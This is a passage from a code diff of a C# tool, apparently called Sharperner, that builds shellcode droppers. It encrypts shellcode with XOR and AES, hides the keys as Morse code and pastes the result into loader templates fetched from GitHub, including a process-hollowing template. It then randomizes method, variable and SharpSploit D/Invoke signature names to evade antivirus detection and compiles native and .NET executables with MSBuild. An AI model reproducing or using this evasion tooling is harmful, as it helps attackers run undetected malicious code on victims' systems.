-                        templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
-                    }
-                    catch
-                    {
-                        Console.WriteLine("[!] Error replacing values");
-                    }
-
-                    // write all back into the file
-                    try
-                    {
-                        Console.WriteLine("[+] Writing shellcode to template file...");
-                        File.WriteAllText(rootFile, templateFileContent);
-                    }
-                    catch (Exception err)
-                    {
-                        Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
-                        Environment.Exit(0);
-                    }
-
-                    //compile with this
-                    //"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe" C: \Users\REUSER\source\repos\ObfuscatorXOR\Sharperner\Sharperner.sln / t:loader
-
-                    var processInfo = new ProcessStartInfo("cmd.exe", "/c \"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath")
-                    {
-                        CreateNoWindow = true,
-                        UseShellExecute = false,
-                        RedirectStandardError = true,
-                        RedirectStandardOutput = true,
-                        WorkingDirectory = @"C:\Windows\System32\"
-                    };
-
-                    StringBuilder sb = new StringBuilder();
-                    Process p = Process.Start(processInfo);
-                    p.OutputDataReceived += (sender, a) => sb.AppendLine(a.Data);
-                    p.BeginOutputReadLine();
-                    p.WaitForExit();
-                    var msBuildPath = sb.ToString().Trim();
-
-                    if (string.IsNullOrEmpty(msBuildPath.ToString()))
-                    {
-                        Console.WriteLine("[!] Couldn't find MSBuild.exe location. Exiting...");
-                    }
-                    else
-                    {
-                        try
-                        {
-
+                            Console.WriteLine("[!] File does not exists in local, fetching online...");
+                            ServicePointManager.Expect100Continue = true;
+                            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                            WebClient client = new WebClient();
                             try
                             {
-                                string strCmd = $"/c \"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\" {slnFile} /t:loader";
-
-                                using (Process compiler = new Process())
-                                {
-                                    compiler.StartInfo.FileName = @"CMD.exe";
-                                    compiler.StartInfo.Arguments = strCmd;
-                                    compiler.StartInfo.UseShellExecute = false;
-                                    compiler.StartInfo.CreateNoWindow = true;
-                                    compiler.StartInfo.RedirectStandardError = true;
-                                    compiler.Start();
-                                }
-
+                                templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/Sharperner/main/templates/template.cs");
                             }
                             catch
                             {
-                                Console.WriteLine("[!] Error compiling. Exiting...");
+                                Console.WriteLine("[!] No internet connection");
                                 Environment.Exit(0);
                             }
+                        }
+                        else
+                        {
+                            templateFileContent = File.ReadAllText(templateFile);
+                        }
+
+                        try
+                        {
+                            // randomize method names
+                            var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
+                            var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
+                            Regex rg = new Regex(pattern);
+                            MatchCollection methods = rg.Matches(templateFileContent);
+                            foreach (var method in methods)
+                            {
+                                if (!method.ToString().Contains("Main"))
+                                {
+                                    var methodName = Regex.Match(method.ToString(), methodNamesPattern);
+                                    templateFileContent = templateFileContent.Replace(methodName.ToString(), GenerateRandomString());
+                                }
+
+                            }
+
+                            //randomize variable names
+                            string[] variableNames = { "xoredAesB64", "xorKey", "aE5k3y", "aE5Iv", "aesEncrypted", "sh3Llc0d3", "lpNumberOfBytesWritten", "processInfo",
+                                                "pHandle", "rMemAddress", "tHandle", "ptr", "theKey", "mixed", "input", "theKeystring", "cipherText", "rawKey", "rawIV", "rijAlg", "decryptor",
+                                                "msDecrypt", "csDecrypt", "srDecrypt", "plaintext", "cipherData", "decryptedData", "ms", "cs", "alg", "MorseForFun","startInfo","procInfo", "binaryPath",
+                                                "random", "aes_key", "aes_iv", "stringBuilder"};
+
+                            foreach (string variableName in variableNames)
+                            {
+                                templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
+                            }
+
+                            // replace in template file
+                            templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
+
                         }
                         catch (Exception err)
                         {
                             Console.WriteLine($"[!] {err.Message}");
+                        }
+
+                        // write all back into the file
+                        try
+                        {
+                            Console.WriteLine("[+] Writing shellcode to template file...");
+                            File.WriteAllText(tempFile, templateFileContent);
+                        }
+                        catch (Exception err)
+                        {
+                            Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
+                        }
+
+                        Compile.CompileAssembly(outputFile, tempFile);
+
+                        Console.WriteLine($"[+] Doing some cleaning...");
+                        Thread.Sleep(1000);
+
+                        File.Delete(tempFile);
+
+                    }
+                    else if (dropperFormat == "cpp")
+                    {
+                        // locate the file
+                        var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
+
+                        if (directory == null)
+                        {
+                            Console.WriteLine("[!] Couldn't locate files. Exiting...");
                             Environment.Exit(0);
                         }
 
-                        Console.WriteLine($"[+] Doing some cleaning...");
+                        var parentDir = directory.FullName;
 
-                        //wait for it to compile
-                        Thread.Sleep(5000);
+                        var rootFile = Path.Combine(parentDir, @"loader\loader.cpp");
 
+                        var templateFile = Path.Combine(parentDir, @"templates\hollow.cpp");
+
+                        var slnFile = Path.Combine(parentDir, @"Sharperner.sln");
+
+                        var templateFileContent = "";
+
+                        // read all content
+                        if (!File.Exists(templateFile)) //if file exists
+                        {
+                            Console.WriteLine("[!] Template file does not exists in local, fetching online...");
+                            ServicePointManager.Expect100Continue = true;
+                            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                            WebClient client = new WebClient();
+                            try
+                            {
+                                templateFileContent = client.DownloadString("https://gist.githubusercontent.com/aniqfakhrul/9d25308ee3666e5d2856e9e940df0297/raw/afed7f6e8479f933c2bad55efb138c93a7646881/hollow_sc.cpp");
+                            }
+                            catch
+                            {
+                                Console.WriteLine("[!] No internet connection");
+                                Environment.Exit(0);
+                            }
+                        }
+                        else
+                        {
+                            templateFileContent = File.ReadAllText(templateFile);
+                        }
+
+                        //create backup copy of the template
+                        string temp = File.ReadAllText(rootFile);
+
+                        // replace required values
                         try
                         {
-                            File.Copy($"{parentDir}\\loader\\x64\\Release\\loader.exe", $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
+                            //randomize variable names
+                            string[] variableNames = { "morsed", "sh3llc0de", "decoded", "b64a3skey", "b64a3siv", "morsedb64a3skey", "morsedb64a3siv", "morsedxorKey", "xorKey",
+                                                "x0rek3y", "ciphertext", "recovered", "policy", "explorer_handle", "hollow_bin", "pid", "bytesWritten", "p_size", "overwrite",
+                                                "translated", "lines", "delim", "ascii_to_morse", "tokenize", "translate_morse", "get_PPID", "howlow_sc"};
 
-                            File.Delete($"{parentDir}\\loader\\x64\\Release\\loader.exe");
+                            foreach (string variableName in variableNames)
+                            {
+                                templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
+                            }
 
-                            Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                            templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
+
                         }
                         catch
                         {
-                            Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
+                            Console.WriteLine("[!] Error replacing values");
                         }
 
-                        //revert the file
-                        File.WriteAllText(rootFile, temp);
-                    }
-                    
-                }
+                        // write all back into the file
+                        try
+                        {
+                            Console.WriteLine("[+] Writing shellcode to template file...");
+                            File.WriteAllText(rootFile, templateFileContent);
+                        }
+                        catch (Exception err)
+                        {
+                            Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
+                            Environment.Exit(0);
+                        }
 
+                        //compile with this
+                        //"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe" C: \Users\REUSER\source\repos\ObfuscatorXOR\Sharperner\Sharperner.sln / t:loader
+
+                        var msBuildPath = GetMSBuildPath();
+
+                        if (string.IsNullOrEmpty(msBuildPath.ToString()))
+                        {
+                            Console.WriteLine("[!] Couldn't find MSBuild.exe location. Exiting...");
+                        }
+                        else
+                        {
+                            try
+                            {
+
+                                try
+                                {
+                                    Console.WriteLine($"[+] Compiling native C++ binary...");
+
+                                    Compile.CompileWithMSBuild(msBuildPath, slnFile, "loader");
+                                }
+                                catch
+                                {
+                                    Console.WriteLine("[!] Error compiling. Exiting...");
+                                    Environment.Exit(0);
+                                }
+                            }
+                            catch (Exception err)
+                            {
+                                Console.WriteLine($"[!] {err.Message}");
+                                Environment.Exit(0);
+                            }
+
+                            //wait for it to compile
+                            Thread.Sleep(4000);
+
+                            try
+                            {
+                                /*
+                                File.Copy($"{parentDir}\\loader\\x64\\Release\\loader.exe", $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
+
+                                File.Delete($"{parentDir}\\loader\\x64\\Release\\loader.exe");
+
+                                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                                    */
+                                var loaderExecutableFilePath = Path.Combine(parentDir, @"loader\x64\Release\loader.exe");
+
+                                var nativeBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\Program.cs");
+
+                                var nativeExecutableBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\bin\x64\Release\DInvoke.exe");
+
+                                Console.WriteLine("[+] Embedding into .NET using D/Invoke Method. Credits to @SharpSploit");
+
+                                var loaderFileContent = File.ReadAllText(nativeBinaryLoaderPath);
+
+                                var tempLoaderFileContent = loaderFileContent;
+
+                                var rawByteArray = File.ReadAllBytes(loaderExecutableFilePath);
+                                var compByteArray = Compress(rawByteArray);
+                                var b64String = Convert.ToBase64String(compByteArray);
+                                var morsedb64String = MorseForFun.Send(b64String);
+
+                                try
+                                {
+                                    //replace all occurences
+                                    string[] signatures = { "morsedb64string", "b64string", "bufferByteArray", "deCompByteArray", "MapMap", "Menyeluruh", "PanggilMapPEMod", "GetPeMetaData", "GetNativeExportAddress",
+                                                    "GetExportAddress", "GetLoadedModuleAddress", "GetLibraryAddress", "LoadModuleFromDisk", "DynamicAPIInvoke", "AllocateBytesToMemory", "RelocateModule",
+                                                    "RewriteModuleIAT", "SetModuleSectionPermissions", "MapThisToMemory", "MapModuleToMemory", "DLLName", "FunctionName", "PeHeader", "OptHeaderSize", "OptHeader",
+                                                    "Magic", "pExport", "ExportRVA", "OrdinalBase", "NumberOfFunctions", "NumberOfNames", "FunctionsRVA", "NamesRVA", "OrdinalsRVA"};
+
+                                    foreach (string signature in signatures)
+                                    {
+                                        string randomWord = GenerateRandomString();
+
+                                        // randomizing in SharpSploit's lib
+                                        foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
+                                        {
+                                            string libFileContent = File.ReadAllText(file);
+                                            loaderFileContent = loaderFileContent.Replace(signature, randomWord);
+                                            libFileContent = libFileContent.Replace(signature, randomWord);
+                                            File.WriteAllText(file, libFileContent);
+
+                                        }
+                                    }
+
+                                    loaderFileContent = loaderFileContent.Replace("REPLACE MORSECODE HERE", morsedb64String);
+
+                                }
+                                catch
+                                {
+                                    Console.WriteLine("[!] Error replacing values");
+                                }
+
+                                try
+                                {
+                                    File.WriteAllText(nativeBinaryLoaderPath, loaderFileContent);
+
+                                    Compile.CompileWithMSBuild(msBuildPath, slnFile, "DInvoke");
+
+                                    Thread.Sleep(2000);
+
+                                    File.Copy(loaderExecutableFilePath, $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
+
+                                    File.Copy(nativeExecutableBinaryLoaderPath, $"{Directory.GetCurrentDirectory()}\\INVOKE_{outputFile}", true);
+
+                                    Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                                }
+                                catch
+                                {
+                                    Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
+                                }
+
+                                Console.WriteLine("[+] Doing some cleaning...");
+
+                                //revert all library files
+                                foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
+                                {
+                                    File.Copy($"{file}.ori", file, true);
+                                }
+
+                                //revert loader
+                                File.WriteAllText(rootFile, temp);
+                                File.Delete(loaderExecutableFilePath);
+
+                                //revert nativeBinaryLoader
+                                File.WriteAllText(nativeBinaryLoaderPath, tempLoaderFileContent);
+                                File.Delete(nativeExecutableBinaryLoaderPath);
+                                Thread.Sleep(1000);
+                            }
+                            catch
+                            {
+                                Console.WriteLine("[!] Error Compiling");
+                            }
+
+                        }
+
+                    }
+                
+                }             
+
+            }
+            else
+            {
+                Console.WriteLine("[!] Invalid arguments");
             }
 
         }
